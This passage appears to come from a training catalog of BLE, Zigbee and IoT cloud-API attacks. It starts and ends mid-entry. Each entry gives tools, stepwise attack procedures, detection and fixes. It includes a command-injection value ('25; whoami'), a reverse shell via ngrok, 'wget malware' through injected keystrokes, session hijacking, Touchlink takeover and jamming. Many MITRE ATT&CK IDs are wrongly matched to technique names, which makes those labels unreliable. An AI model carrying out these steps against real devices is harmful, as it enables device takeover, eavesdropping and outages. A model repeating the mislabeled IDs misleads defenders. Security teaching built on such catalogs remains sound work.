- **Detection**: Mesh key change or auth failure
- **Solution**: Secure Trust Center authentication
- **Tags**: Zigbee, Trust Center, Spoof

## BLE HID Over GATT Attack

- **Attack Type**: HID Spoofing
- **Target**: BLE-enabled Laptop / Desktop
- **Vulnerability**: Unauthenticated HID GATT devices
- **MITRE**: T1056.001 - Keystroke Injection
- **Impact**: Remote Code Execution
- **Tools**: Linux + BlueZ + HID GATT profile
- **Scenario**: Exploit BLE HID-over-GATT to send unauthorized keyboard inputs.
- **Attack Steps**: Step 1: Set up Linux system with BLE HID profile loaded.Step 2: Connect to target system that allows BLE keyboard pairing.Step 3: Send crafted GATT HID report packets (e.g., open terminal).Step 4: Run commands via injected keystrokes (e.g., wget malware).Step 5: Observe impact on target machine.Step 6: Log system behavior.Step 7: Demonstrate danger of HID-GATT devices without whitelisting.
- **Detection**: Keyboard input logs with strange behavior
- **Solution**: Pair only verified HID devices
- **Tags**: BLE, HID, GATT, Keyboard

## Zigbee Broadcast Association Denial

- **Attack Type**: Association Flood
- **Target**: Zigbee Coordinator
- **Vulnerability**: No protection from join flood
- **MITRE**: T1499 - Denial of Service
- **Impact**: Onboarding Failure
- **Tools**: KillerBee, zbassocflood
- **Scenario**: Deny new Zigbee devices from joining by flooding association requests.
- **Attack Steps**: Step 1: Launch zbassocflood from KillerBee with CC2531.Step 2: Broadcast many fake device join requests.Step 3: Coordinator becomes overwhelmed and stops accepting new devices.Step 4: Try to join a legitimate device and fail.Step 5: Log error or timeout on legitimate device.Step 6: Demonstrate how flood leads to service denial.Step 7: Recommend limiting association rate.
- **Detection**: Failed join logs
- **Solution**: Limit join requests per second
- **Tags**: Zigbee, DoS, Association Flood

## BLE GATT Buffer Overflow Emulation

- **Attack Type**: Memory Exploitation
- **Target**: BLE Embedded Device
- **Vulnerability**: Poor input validation on GATT write
- **MITRE**: T1203 - Exploitation for Execution
- **Impact**: Device Crash / Code Execution
- **Tools**: Custom BLE app with fuzzing logic
- **Scenario**: Emulate buffer overflow by sending malformed GATT requests.
- **Attack Steps**: Step 1: Develop a script to connect and send oversized GATT write packets.Step 2: Connect to BLE device (e.g., BLE thermometer).Step 3: Inject payload larger than expected buffer.Step 4: Monitor for crashes, reboots, or error messages.Step 5: Check BLE logs or UART output if accessible.Step 6: Demonstrate potential RCE risk.Step 7: Discuss bounds checking and validation.
- **Detection**: Sudden disconnect or error dump
- **Solution**: Enforce GATT size limits
- **Tags**: BLE, Overflow, Fuzzing

## Zigbee Energy Scan Jamming

- **Attack Type**: Passive Channel Jamming
- **Target**: Zigbee Sensor / Bulb
- **Vulnerability**: Unprotected energy scan process
- **MITRE**: T1498.001 - Radio Frequency Jamming
- **Impact**: Network Setup Failure
- **Tools**: RF Jammer, SDR, GQRX
- **Scenario**: Confuse Zigbee device channel selection using high-noise energy scan.
- **Attack Steps**: Step 1: Use an SDR tool (e.g., HackRF) to identify active Zigbee channel.Step 2: Transmit high-power RF signal on all Zigbee channels.Step 3: Force device to fail during energy scan or pick suboptimal channel.Step 4: Observe failure to join mesh or degraded signal.Step 5: Log results and retry.Step 6: Demonstrate attack persistence.Step 7: Discuss RF shielding and fixed channel use.
- **Detection**: No join or poor signal
- **Solution**: Hardened RF channel configs
- **Tags**: Zigbee, Jamming, SDR

## BLE UUID Dictionary Attack

- **Attack Type**: Service Discovery Abuse
- **Target**: BLE Appliance or Gadget
- **Vulnerability**: Predictable UUID exposure
- **MITRE**: T1592.002 - Component Enumeration
- **Impact**: Service Enumeration
- **Tools**: gattacker, Python UUID script
- **Scenario**: Attacker uses UUID wordlist to brute-force available BLE services.
- **Attack Steps**: Step 1: Connect to BLE device using gattacker.Step 2: Run UUID enumeration script using known vendor/service UUIDs.Step 3: Test UUIDs for response or error codes.Step 4: Log which ones are active.Step 5: Use active services for further interaction or data dump.Step 6: Demonstrate that vendor-specific services can be leaked.Step 7: Recommend obfuscation or encryption.
- **Detection**: Unexpected UUID access logs
- **Solution**: Obfuscate proprietary UUIDs
- **Tags**: BLE, UUID, Recon

## Zigbee Inter-PAN Message Abuse

- **Attack Type**: Inter-PAN Exploit
- **Target**: Zigbee Light or Sensor
- **Vulnerability**: Unrestricted Inter-PAN command handling
- **MITRE**: T1210 - Exploiting Trusted Functionality
- **Impact**: Command Execution
- **Tools**: CC2531, Custom Inter-PAN Message
- **Scenario**: Attacker sends unauthenticated inter-PAN messages to reset or confuse device.
- **Attack Steps**: Step 1: Use CC2531 with customized packet crafting tool.Step 2: Create Inter-PAN frame with bogus commands (e.g., factory reset, identify blink).Step 3: Broadcast message near vulnerable Zigbee device.Step 4: Device executes command even though not in same PAN.Step 5: Observe LED flash or settings reset.Step 6: Log unintended behavior.Step 7: Discuss disabling Inter-PAN unless needed.
- **Detection**: Reset or action by rogue command
- **Solution**: Filter inter-PAN messages
- **Tags**: Zigbee, Inter-PAN, Unauth Commands

## BLE Advertising Spam Flood

- **Attack Type**: BLE DoS
- **Target**: BLE Smartphones / IoT Hub
- **Vulnerability**: BLE spec allows unlimited advertisers
- **MITRE**: T1499.001 - Network Denial of Service
- **Impact**: Device Pairing Failure
- **Tools**: Raspberry Pi, BlueZ, BLE advertisement scripts
- **Scenario**: Attacker floods BLE advertising channels with fake advertisements to degrade performance.
- **Attack Steps**: Step 1: Configure Raspberry Pi with Bluetooth adapter and BlueZ.Step 2: Use a Python script to continuously broadcast BLE advertisements on all 3 advertising channels.Step 3: Change MAC address frequently to simulate many fake devices.Step 4: Nearby devices become overloaded with scanning and cannot reliably connect to real devices.Step 5: Monitor connection failure on victim’s phone or app.Step 6: Log CPU/network strain on scanning devices.Step 7: Recommend filtering unknown MACs and limiting advertisement scan rate.
- **Detection**: Spike in detected devices and slow pairing
- **Solution**: Advertisement whitelisting
- **Tags**: BLE, Advertisement, Flooding, DoS

## Zigbee Channel Hopping Desynchronization

- **Attack Type**: Channel Sync Disruption
- **Target**: Zigbee Mesh Network
- **Vulnerability**: Zigbee lacks secure channel change protocol
- **MITRE**: T1499 - Network DoS
- **Impact**: Mesh Split / Device Isolation
- **Tools**: SDR (HackRF), Zigbee Beacon Manipulation Tool
- **Scenario**: Send out-of-band channel switch signals to desynchronize Zigbee mesh nodes.
- **Attack Steps**: Step 1: Use HackRF with Zigbee beacon crafting script.Step 2: Craft and transmit a fake beacon suggesting channel switch.Step 3: Some nodes jump to a different channel while others remain.Step 4: Observe partial mesh disconnection.Step 5: Log communication failures and hub errors.Step 6: Revert devices and observe recovery.Step 7: Recommend fixed channels or secure re-sync mechanism.
- **Detection**: Zigbee signal graph shows split
- **Solution**: Use secure channel negotiation
- **Tags**: Zigbee, Channel Hopping, Mesh Desync

## BLE Long Range Scan Surveillance

- **Attack Type**: Passive Recon
- **Target**: BLE Wearables
- **Vulnerability**: Static BLE MAC Addresses
- **MITRE**: T1421 - Signal Capture
- **Impact**: Privacy Violation
- **Tools**: Ubertooth One + Directional Antenna
- **Scenario**: Using high-gain antennas to scan BLE advertisements from distant locations for tracking.
- **Attack Steps**: Step 1: Connect Ubertooth One with a high-gain antenna to a Linux laptop.Step 2: Use ubertooth-btle and Wireshark to scan BLE advertisement traffic.Step 3: Filter out static MACs and note device movement patterns.Step 4: Map MACs to known device types (e.g., Fitbits, Smartwatches).Step 5: Log MAC address reuse and approximate location.Step 6: Track movement of individuals carrying BLE devices.Step 7: Recommend MAC randomization and advertising interval randomization.
- **Detection**: Repeated MAC patterns
- **Solution**: Enable MAC address randomization
- **Tags**: BLE, Surveillance, Ubertooth

## Zigbee Custom Payload Injection

- **Attack Type**: Protocol Abuse
- **Target**: Zigbee Light / Sensor
- **Vulnerability**: No strict ZCL field validation
- **MITRE**: T1203 - Exploitation for Execution
- **Impact**: Device Crash or Reset
- **Tools**: KillerBee, Python, Custom ZCL payload tool
- **Scenario**: Craft and inject malformed ZCL commands to crash or confuse Zigbee endpoint devices.
- **Attack Steps**: Step 1: Write a Python script to generate malformed ZCL commands (e.g., wrong length or type).Step 2: Use KillerBee’s zbreplay or zbfake to inject the payload.Step 3: Target device attempts to parse the command and fails.Step 4: Observe unexpected behavior such as blinking, rebooting, or ignoring valid commands.Step 5: Capture Zigbee logs or UART output.Step 6: Test impact on different firmware versions.Step 7: Recommend protocol validation on device firmware.
- **Detection**: Error logs or crash output
- **Solution**: Validate ZCL structure
- **Tags**: Zigbee, Payload Injection

## BLE Audio Sniff via Misused Microphone GATT

- **Attack Type**: Privacy Eavesdropping
- **Target**: BLE Smart Mic or Hearing Aid
- **Vulnerability**: Insecure audio GATT permissions
- **MITRE**: T1421 - Signal Capture
- **Impact**: Privacy Violation
- **Tools**: BLEAH, BlueZ, Custom GATT parser
- **Scenario**: Exploit poorly protected audio streaming service over BLE to capture voice data.
- **Attack Steps**: Step 1: Use bleah to identify microphone/audio services on nearby BLE devices.Step 2: Connect without pairing to check access to audio GATT characteristics.Step 3: Read stream buffers from audio services.Step 4: Save and play captured data.Step 5: Demonstrate unprotected mic access.Step 6: Log GATT UUIDs and access behavior.Step 7: Recommend strict pairing and access control.
- **Detection**: GATT read logs of audio data
- **Solution**: Restrict audio UUIDs to bonded devices
- **Tags**: BLE, Audio Capture, GATT

## Zigbee Device Firmware Downgrade

- **Attack Type**: Downgrade Attack
- **Target**: Zigbee Light / Plug
- **Vulnerability**: No firmware downgrade protection
- **MITRE**: T1600 - Firmware Manipulation
- **Impact**: Reintroduction of Vulnerability
- **Tools**: Custom OTA Tool, Older Firmware Image, CC2531
- **Scenario**: Push an older vulnerable firmware to a Zigbee device that accepts unsigned updates.
- **Attack Steps**: Step 1: Obtain older firmware image from vendor site or device dump.Step 2: Use Zigbee OTA tool to push the outdated firmware over-the-air.Step 3: Target device accepts it and reverts.Step 4: Now attacker can use known old vulnerabilities.Step 5: Demonstrate a second-stage attack (e.g., ZCL exploit).Step 6: Log firmware version before and after.Step 7: Recommend firmware version locking and signing.
- **Detection**: Version log discrepancies
- **Solution**: Prevent downgrade at bootloader level
- **Tags**: Zigbee, Firmware Downgrade

## BLE Connection Hijack

- **Attack Type**: Session Takeover
- **Target**: BLE Health Device
- **Vulnerability**: No session integrity check
- **MITRE**: T1557.001 - MITM
- **Impact**: Data Manipulation / Privacy Leak
- **Tools**: BtleJuice, Dual BLE Dongles
- **Scenario**: Hijack a live BLE session between device and app to inject malicious commands.
- **Attack Steps**: Step 1: Run BtleJuice with two BLE adapters to act as proxy.Step 2: Wait for device and app to initiate a connection.Step 3: Seamlessly take over as the middle device.Step 4: Modify data in-transit or inject new GATT writes.Step 5: Watch mobile app receive fake data.Step 6: Log proxy commands and BLE traffic.Step 7: Recommend secure pairing and session re-auth.
- **Detection**: Unexpected data mismatch
- **Solution**: Enforce pairing and signed session data
- **Tags**: BLE, Session Hijack, BtleJuice

## Zigbee Network Key Reuse Exploit

- **Attack Type**: Crypto Weakness
- **Target**: Zigbee Mesh / Devices
- **Vulnerability**: Shared or reused keys across products
- **MITRE**: T1557.003 - Credential Reuse
- **Impact**: Mesh Takeover
- **Tools**: KillerBee, zbkeys, Wireshark
- **Scenario**: Discover reused Zigbee network keys from multiple devices and use it to join mesh.
- **Attack Steps**: Step 1: Sniff Zigbee traffic during new device joins using zbdump.Step 2: Extract and decode network keys using zbkeys.Step 3: Try to join a different Zigbee mesh using same key.Step 4: Join success shows reused key across products.Step 5: Log successful unauthorized mesh join.Step 6: Demonstrate traffic sniffing or control.Step 7: Recommend unique per-network key generation.
- **Detection**: Unauthorized join logs
- **Solution**: Unique key per mesh ID
- **Tags**: Zigbee, Key Reuse, Crypto

## BLE Device Exhaustion via Connection Requests

- **Attack Type**: DoS
- **Target**: BLE Sensor or Toy
- **Vulnerability**: No limit on pending connections
- **MITRE**: T1499.004 - Resource Exhaustion
- **Impact**: Connection Failure
- **Tools**: BlueZ + Shell Script
- **Scenario**: Fill BLE device’s connection queue to block legitimate connections.
- **Attack Steps**: Step 1: Use hcitool and a loop to send hundreds of BLE connection attempts.Step 2: Send connections but do not complete pairing.Step 3: Target BLE device queues pending connections.Step 4: It becomes unresponsive to legitimate user.Step 5: Monitor user unable to connect or app timeout.Step 6: Log packet and connection queues.Step 7: Suggest rejecting half-open sessions or timeouts.
- **Detection**: Queued connection spikes
- **Solution**: Rate limit + timeouts
- **Tags**: BLE, Flooding, Connection Exhaustion

## Zigbee Identify Command Abuse

- **Attack Type**: User Annoyance Attack
- **Target**: Zigbee Light / Smart Plug
- **Vulnerability**: Unrestricted identify command
- **MITRE**: T1583.006 - Abuse Legit Function
- **Impact**: Device Disruption
- **Tools**: KillerBee, zbfake or custom script
- **Scenario**: Exploit the “Identify” ZCL command to continuously flash lights or devices.
- **Attack Steps**: Step 1: Send ZCL “Identify” command with long duration via Zigbee tool.Step 2: Target Zigbee device (e.g., bulb) starts flashing.Step 3: Send repeatedly to loop or stack command.Step 4: User cannot stop flashing until timeout or reset.Step 5: Demonstrate persistence and user frustration.Step 6: Log blinking duration and command trace.Step 7: Recommend limiting identify timeout or requiring auth.
- **Detection**: Long flashing pattern in logs
- **Solution**: Require pairing for Identify use
- **Tags**: Zigbee, ZCL, Annoyance, Flash

## BLE Reconnection Loop Exploit

- **Attack Type**: BLE DoS
- **Target**: BLE Beacon / Tracker
- **Vulnerability**: No session cooldown or rate limiting
- **MITRE**: T1499 - DoS via Resource Depletion
- **Impact**: Device Lag / Battery Drain
- **Tools**: BlueZ, Python bluepy, BLE Adapter
- **Scenario**: Force a BLE device into continuous reconnection attempts to exhaust power and reduce usability.
- **Attack Steps**: Step 1: Use a Python script (bluepy) to repeatedly connect and disconnect to a BLE device.Step 2: Observe BLE device begin to automatically reconnect after each disconnect.Step 3: Repeat cycle 20+ times in a short period.Step 4: Log device's reconnection attempts and CPU spikes.Step 5: Battery drains faster due to constant connection handling.Step 6: Demonstrate unresponsiveness or lag in app response.Step 7: Recommend connection throttling and sleep timer implementation.
- **Detection**: Logs show repeated connects
- **Solution**: Add reconnection delays or lockouts
- **Tags**: BLE, DoS, Loop Exploit

## Zigbee Touchlink Hijack Attack

- **Attack Type**: Device Takeover
- **Target**: Zigbee Smart Bulbs / Switches
- **Vulnerability**: Touchlink lacks authentication
- **MITRE**: T1203 - Exploiting Insecure Protocol
- **Impact**: Unauthorized Takeover
- **Tools**: Zigbee Touchlink Remote Emulator, CC2531
- **Scenario**: Abusing Zigbee Touchlink commissioning to force devices to pair with rogue controller without user consent.
- **Attack Steps**: Step 1: Set up CC2531 with Zigbee Touchlink command tool.Step 2: Broadcast Touchlink identify command to target bulb (even if already paired).Step 3: Send command to force device to leave its current network.Step 4: Send new network info to join rogue controller.Step 5: Device is now under attacker's control without user approval.Step 6: Log forced pairing and command reception.Step 7: Recommend disabling Touchlink commissioning if unused.
- **Detection**: Device silently joins rogue network
- **Solution**: Disable Touchlink, use install codes
- **Tags**: Zigbee, Touchlink, Hijack

## BLE MTU Size Overflow Attack

- **Attack Type**: MTU Misuse
- **Target**: BLE Health Monitor
- **Vulnerability**: No check on MTU boundary
- **MITRE**: T1203 - Protocol Exploit
- **Impact**: Stack Crash or Reboot
- **Tools**: BlueZ, Custom BLE Client Script
- **Scenario**: Attack BLE stack by requesting excessive MTU (Maximum Transmission Unit) size to trigger instability or crash.
- **Attack Steps**: Step 1: Connect to a BLE device using a modified GATT client.Step 2: Send an MTU exchange request with a very large (invalid) MTU size (e.g., 1024 bytes+).Step 3: Device may accept, ignore, or crash depending on firmware.Step 4: Observe whether connection is dropped, hung, or if the device reboots.Step 5: Log MTU negotiation and response behavior.Step 6: Demonstrate crash in unpatched devices.Step 7: Recommend enforcing MTU size caps.
- **Detection**: Disconnect event after MTU exchange
- **Solution**: Restrict MTU sizes on negotiation
- **Tags**: BLE, MTU Attack, Crash

## Zigbee Parent Table Flood

- **Attack Type**: Routing Table Exhaustion
- **Target**: Zigbee Router / Coordinator
- **Vulnerability**: Small and insecure parent table
- **MITRE**: T1499.004 - Resource Exhaustion
- **Impact**: Network Join Denial
- **Tools**: KillerBee, zbassocflood, Multiple MAC Spoofing
- **Scenario**: Flood a Zigbee router with join requests to overflow its parent table and block legitimate child devices.
- **Attack Steps**: Step 1: Use KillerBee’s zbassocflood to send repeated join requests from many spoofed MACs.Step 2: Zigbee router adds them to its limited-size parent table.Step 3: Real child devices trying to join are denied due to full table.Step 4: Observe logs showing failed joins from legitimate devices.Step 5: Log router’s internal table status (if possible).Step 6: Highlight network disruption.Step 7: Recommend enforcing MAC-based whitelist and child limits.
- **Detection**: Join table full messages
- **Solution**: Limit and verify MAC before joining
- **Tags**: Zigbee, DoS, Routing Flood

## BLE Attribute Caching Attack

- **Attack Type**: GATT Manipulation
- **Target**: BLE App + Peripheral
- **Vulnerability**: Clients trusting cached attributes
- **MITRE**: T1565 - Data Manipulation
- **Impact**: Data Poisoning / UI Mislead
- **Tools**: BLE Peripheral Emulator (gatt-server), BlueZ
- **Scenario**: Trick BLE clients into using outdated or fake GATT data via attribute caching.
- **Attack Steps**: Step 1: Create a fake BLE peripheral using BlueZ’s gatt-server.Step 2: Advertise same MAC and GATT service structure as the real device.Step 3: Send manipulated GATT attribute values (e.g., fake sensor readings).Step 4: Connect with a BLE client that uses cached attribute tables (e.g., older Android versions).Step 5: Observe BLE app accepting and displaying spoofed data.Step 6: Log user data intake and mismatch.Step 7: Recommend disabling client-side caching or enforcing rediscovery.
- **Detection**: Inconsistent values shown
- **Solution**: Force rediscover or revalidate GATT
- **Tags**: BLE, GATT, Cache Poison

## Unauthorized Data Access via Hardcoded API Keys

- **Attack Type**: Insecure API Exploitation
- **Target**: Smart Camera
- **Vulnerability**: Hardcoded API Credentials
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Confidentiality breach, user data theft
- **Tools**: Binwalk, Strings, Postman
- **Scenario**: An attacker extracts hardcoded API keys from firmware to access sensitive cloud-stored user data.
- **Attack Steps**: Step 1: Download the firmware image of the IoT device from the vendor’s support website. Step 2: Use binwalk to extract the firmware contents. Step 3: Search the extracted files using strings or a text editor to locate hardcoded API keys or tokens. Step 4: Identify the associated cloud service or API endpoint in the firmware or configuration files. Step 5: Use Postman to send requests using the API key to the cloud API (e.g., get user data, device logs). Step 6: Access sensitive information such as device locations, user account info, etc.
- **Detection**: Monitor API requests for unauthorized tokens, audit firmware for sensitive strings
- **Solution**: Use secure credential storage and rotate API keys; never hardcode them
- **Tags**: firmware, api, token, cloud, camera

## Account Takeover via Insecure Password Reset API

- **Attack Type**: Cloud API Abuse
- **Target**: Smart Bulb App
- **Vulnerability**: Weak password reset mechanism
- **MITRE**: T1110.001 (Credential Stuffing)
- **Impact**: Account takeover, control of devices
- **Tools**: Burp Suite, Firefox DevTools, MailSlurp
- **Scenario**: An attacker manipulates insecure password reset APIs to take over user accounts.
- **Attack Steps**: Step 1: Create a legitimate account on the IoT platform (e.g., smart light app). Step 2: Intercept the password reset request using Burp Suite. Step 3: Analyze the POST request for predictable fields like email/username and OTP token. Step 4: Notice the lack of rate-limiting or validation mechanisms. Step 5: Attempt brute-forcing OTPs or token reuse from earlier responses. Step 6: Successfully reset password and gain control of another user's account.
- **Detection**: Analyze logs for excessive reset attempts and brute-force patterns
- **Solution**: Implement OTP rate-limiting, expire tokens quickly, use CAPTCHA
- **Tags**: password reset, api abuse, account takeover

## API Enumeration via Lack of Authentication

- **Attack Type**: Cloud API Enumeration
- **Target**: Smart Lock System
- **Vulnerability**: Missing authentication on API endpoints
- **MITRE**: T1595.001 (Active Scanning)
- **Impact**: Unauthorized access to device data
- **Tools**: ffuf, Burp Suite, Postman
- **Scenario**: The attacker discovers sensitive APIs by fuzzing without authentication.
- **Attack Steps**: Step 1: Monitor the mobile app traffic to get a base URL for the API (e.g., api.smartlock.com). Step 2: Use a tool like ffuf to fuzz common API paths (e.g., /users, /devices, /logs). Step 3: Identify open endpoints that respond without requiring authentication. Step 4: Use Postman to interact with the discovered endpoints and extract data. Step 5: Access log data, user metadata, or device info without needing to log in. Step 6: Compile findings and simulate breach in training dashboard.
- **Detection**: Enable logging for API scans and endpoint access anomalies
- **Solution**: Use auth headers (OAuth2, JWT) and enforce auth at all endpoints
- **Tags**: unauthenticated api, scanning, information disclosure

## Cloud Command Injection via Insecure API Parameter

- **Attack Type**: Remote Command Execution
- **Target**: Smart Thermostat
- **Vulnerability**: Improper input sanitization in cloud API
- **MITRE**: T1059.001 (Command and Scripting Interpreter)
- **Impact**: Full device compromise, system-level access
- **Tools**: Burp Suite, Postman, Ngrok
- **Scenario**: A smart thermostat’s cloud API fails to sanitize command input, enabling attackers to inject system-level commands.
- **Attack Steps**: Step 1: Analyze the mobile app’s traffic using Burp Suite to locate a vulnerable API like /api/set_temperature. Step 2: Observe JSON body in API calls that includes temperature as input. Step 3: Modify the temperature value to include command injection payload (e.g., "value":"25; whoami"). Step 4: Send the crafted request to the API. Step 5: Observe output, such as whoami results, returned or logged on server. Step 6: Chain more commands (e.g., reverse shell via ngrok) to escalate.
- **Detection**: Monitor API logs for unexpected characters or input format anomalies
- **Solution**: Sanitize and validate inputs server-side; enforce schema checks
- **Tags**: command injection, cloud api, smart thermostat

## Replay Attack on Cloud-Based Device Control API

- **Attack Type**: Replay Attack
- **Target**: Smart Plug
- **Vulnerability**: Missing session validation or token expiration
- **MITRE**: T1631 (Replay Capture)
- **Impact**: Remote control without valid login
- **Tools**: Wireshark, Burp Suite, Postman
- **Scenario**: Attackers capture and reuse valid API calls to control devices without reauthentication.
- **Attack Steps**: Step 1: Use Wireshark or Burp Suite to capture traffic from the IoT mobile app. Step 2: Identify API calls that control the device, such as POST /device/on. Step 3: Save the request with authentication header and payload. Step 4: Replay the same request using Postman after the session has expired. Step 5: Observe that the device still responds due to lack of nonce or session tokens. Step 6: Simulate how this allows an attacker to turn on/off devices repeatedly without credentials.
- **Detection**: Detect repeated identical request patterns or tokens
- **Solution**: Use nonces or timestamps in each request to prevent replays
- **Tags**: replay attack, session reuse, api, device control

## Session Hijacking via Poor Token Handling

- **Attack Type**: Session Hijack
- **Target**: Smart Doorbell
- **Vulnerability**: Static or long-lived tokens
- **MITRE**: T1550.002 (Pass the Token)
- **Impact**: Session impersonation, privacy breach
- **Tools**: Burp Suite, Wireshark, Postman
- **Scenario**: A cloud API uses predictable or static session tokens that attackers can reuse to impersonate legitimate users.
- **Attack Steps**: Step 1: Install the mobile app for a smart doorbell on a test phone.Step 2: Use Burp Suite or Wireshark to intercept HTTP requests from the app to the cloud API.Step 3: Observe the Authorization headers, looking for tokens like session_id=abc123.Step 4: Notice that the session token does not expire quickly or is reused after logout.Step 5: Reuse the same token from another machine via Postman to send commands to the API.Step 6: Successfully access user-specific APIs (e.g., live video feed, logs) without reauthentication.Step 7: Simulate impact by showing unauthorized access to private camera footage.
- **Detection**: Log IPs/timestamps of token reuse and monitor geographic anomalies
- **Solution**: Use rotating tokens with short expiry; enable token revocation
- **Tags**: session hijack, tokens, cloud api, camera

## Device Spoofing via Insecure Device Registration API

- **Attack Type**: Device Spoofing
- **Target**: Smart Appliance
- **Vulnerability**: Weak verification during registration
- **MITRE**: T1587.001 (Valid Accounts)
- **Impact**: Fake telemetry, DoS, data poisoning
- **Tools**: Burp Suite, Postman, JWT.io
- **Scenario**: An attacker registers a fake device to the cloud, impersonating a real user’s smart appliance.
- **Attack Steps**: Step 1: Intercept traffic while registering a real device using the mobile app.Step 2: Identify the endpoint (e.g., /api/registerDevice) and the payload structure used.Step 3: Notice that the device identifier (e.g., MAC address or UUID) can be modified manually.Step 4: Craft a new registration request using a forged or cloned device ID.Step 5: Submit the request using Postman to the API server.Step 6: API accepts the fake device, which now receives cloud commands or sends fake telemetry.Step 7: Simulate this by injecting fake temperature or motion values into the platform dashboard.
- **Detection**: Cross-verify device fingerprint (IP/firmware/hardware ID) with backend
- **Solution**: Validate device registration using secure unique hardware fingerprints
- **Tags**: device spoofing, register api, impersonation

## Overprivileged Cloud API Tokens

- **Attack Type**: Privilege Escalation
- **Target**: Smart Thermostat
- **Vulnerability**: Full-scope tokens exposed to regular users
- **MITRE**: T1548.002 (Access Token Abuse)
- **Impact**: Privilege escalation, device takeover
- **Tools**: APKTool, Burp Suite, JWT.io, Postman
- **Scenario**: A mobile app is granted full-access tokens instead of limited scopes, allowing attackers full access if compromised.
- **Attack Steps**: Step 1: Extract the Android APK of the mobile app using APKTool.Step 2: Analyze code or config files to find embedded OAuth tokens or token scopes.Step 3: Discover that the app uses a full-access token (e.g., read/write/control) even for regular users.Step 4: Copy the token and use Postman to test APIs not normally visible (e.g., admin endpoints).Step 5: Observe successful access to advanced APIs like firmware upgrade or user deletion.Step 6: Simulate privilege escalation by triggering hidden APIs using the same token.
- **Detection**: Monitor API usage by token scope and audit overprivilege
- **Solution**: Use least privilege model in token scope assignment
- **Tags**: privilege escalation, oauth, cloud api, firmware

## Cloud-Based Denial of Service via API Abuse

- **Attack Type**: DoS Attack
- **Target**: Smart Plugs / Bulbs
- **Vulnerability**: No rate-limiting on critical endpoints
- **MITRE**: T1499 (Endpoint DoS)
- **Impact**: Cloud API resource exhaustion
- **Tools**: ffuf, Curl, Python script, Postman
- **Scenario**: Attackers flood the cloud API controlling IoT devices, causing outages.
- **Attack Steps**: Step 1: Identify an unprotected API endpoint like /api/sendCommand using fuzzing (ffuf).Step 2: Craft a Python script to send thousands of POST requests to the endpoint.Step 3: Send repeated “turn on/off” commands to multiple devices in quick succession.Step 4: Observe performance degradation, delayed response, or API timeouts.Step 5: For educational simulation, show how a few lines of code can overwhelm unthrottled APIs.Step 6: Analyze logs to count API calls per minute.
- **Detection**: Monitor API usage per IP and request rate
- **Solution**: Implement throttling, rate-limiting and CAPTCHA
- **Tags**: api abuse, dos, rate limiting, smart plug

## Cloud API Key Leakage via Public GitHub Repo

- **Attack Type**: Credential Leakage
- **Target**: Smart Irrigation
- **Vulnerability**: Exposed cloud API key in public repo
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Unauthorized control and data breach
- **Tools**: GitHub Dorks, TruffleHog, Postman
- **Scenario**: Developer accidentally commits cloud API keys to a public repo.
- **Attack Steps**: Step 1: Use GitHub search with dorks like "api_key" AND "iot" or use TruffleHog to scan repos.Step 2: Identify a key like API_KEY=abc123XYZ used by a smart irrigation system’s cloud backend.Step 3: Copy the key and analyze associated endpoints using Postman.Step 4: Send GET/POST requests to test access (e.g., control sprinklers, modify schedule).Step 5: Successfully gain access to live irrigation control system.Step 6: Demonstrate in class how secrets in public code bases can cause major breaches.
- **Detection**: Use GitHub secret scanners and alerting bots
- **Solution**: Never hardcode or commit secrets; use secret managers
- **Tags**: github, credential leak, cloud, smart farming

## Lack of HTTPS in Cloud API Calls

- **Attack Type**: MITM Attack
- **Target**: Smart Light
- **Vulnerability**: No HTTPS in cloud communication
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Credential theft, device hijack
- **Tools**: Ettercap, Wireshark, MITMf
- **Scenario**: IoT device cloud communication uses plain HTTP, allowing attackers to sniff credentials or commands.
- **Attack Steps**: Step 1: Connect to the same Wi-Fi network as a target IoT device.Step 2: Use MITMf or Ettercap to perform ARP spoofing and redirect the device traffic.Step 3: Capture plain HTTP API traffic between the device and the cloud.Step 4: Observe commands (e.g., GET /device/status) and even credentials sent in plaintext.Step 5: Replay requests or modify payloads using Postman.Step 6: Simulate interception of sensitive data or full control of device without encryption.
- **Detection**: Monitor for unsecured HTTP requests; use HSTS headers
- **Solution**: Enforce HTTPS and SSL pinning on all devices and apps
- **Tags**: insecure transport, http, sniffing, iot

## Forgotten Admin API Exposed to Internet

- **Attack Type**: Forgotten Interface Abuse
- **Target**: Any IoT Backend
- **Vulnerability**: Exposed and unauthenticated legacy APIs
- **MITRE**: T1068 (Exploitation of Vulnerability)
- **Impact**: Remote takeover of cloud-connected devices
- **Tools**: Nmap, ffuf, Postman
- **Scenario**: Developer left an old admin API endpoint active and unauthenticated on the cloud server.
- **Attack Steps**: Step 1: Scan the cloud host using nmap or fuzz with ffuf to enumerate available endpoints.Step 2: Discover /api/admin/debug returning verbose output without needing login.Step 3: Use Postman to send GET/POST requests and find commands like device reboot or firmware update.Step 4: Test commands and simulate system-wide impact like mass reboot or device erasure.Step 5: Log API response codes and system status before and after to show impact.
- **Detection**: Periodically scan all public APIs for unauthenticated access
- **Solution**: Decommission legacy endpoints; apply strict auth policies
- **Tags**: legacy api, admin access, debug, exposed

## Token Theft via Reverse Proxy Misconfiguration

- **Attack Type**: Token Interception
- **Target**: Any IoT Device
- **Vulnerability**: Token exposure via proxy headers
- **MITRE**: T1557.003 (Application Layer Protocol Confusion)
- **Impact**: Stolen sessions, data compromise
- **Tools**: Ngrok, Burp Suite, ZAP
- **Scenario**: Reverse proxy passes tokens to backend APIs insecurely, allowing token capture.
- **Attack Steps**: Step 1: Set up a reverse proxy using ngrok or simulate one misconfigured in a lab setup.Step 2: Send requests with bearer tokens and observe if the proxy logs/store them in headers.Step 3: Check whether the proxy sends tokens to an external log server or error handler.Step 4: Extract token from logs or error messages and reuse it to access protected APIs.Step 5: Simulate unauthorized access using stolen token with Postman.
- **Detection**: Inspect logs and headers for token leakage
- **Solution**: Properly configure proxies and redact sensitive headers
- **Tags**: reverse proxy, token leakage, auth header

## Misconfigured Cloud Storage (S3 Bucket) Exposure

- **Attack Type**: Cloud Storage Exposure
- **Target**: Any IoT Device
- **Vulnerability**: Public cloud storage with write access
- **MITRE**: T1600 (Weakened Domain Functionality)
- **Impact**: Firmware tampering, mass compromise
- **Tools**: AWS CLI, S3Scanner, Burp Suite
- **Scenario**: Cloud buckets used for firmware updates are publicly writable.
